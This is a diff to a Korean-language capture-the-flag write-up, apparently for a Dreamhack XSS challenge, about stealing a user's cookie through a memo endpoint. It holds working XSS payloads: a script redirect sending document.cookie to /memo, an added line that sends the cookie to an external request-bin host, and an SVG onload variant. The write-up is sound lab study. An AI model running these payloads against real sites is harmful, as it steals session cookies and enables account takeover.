@@ -125,13 +125,23 @@
     flag 엔드포인트에서 다음과 같은 익스플로잇 코드를 입력하면
     memo 엔드포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있음.
 
-    <script>location.href = "/memo?memo=" + document.cookie;</script>
+    <script>location.href = "/memo?memo="+document.cookie;</script>
 
 ## 웹 서버 사용
 
     외부에서 접근 가능한 웹 서버를 통해 탈취한 쿠키를 확인할 수 있음
     flag 기능에서 다음과 같은 익스플로잇 코드를 입력하면,
     접속 기록에 포함된 FLAG를 확인할 수 있다.
+
+    <script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</script>
+
+
+`FALG page =>  <svg/onload=location="/memo?memo="+document.cookie;>`
+
+    SVG 태그는 벡터 그래픽을 표현할 때 사용되는 데 이 태그를 이용하여 XSS 
+    테스트가 가능하다.
+
+
 
 
 
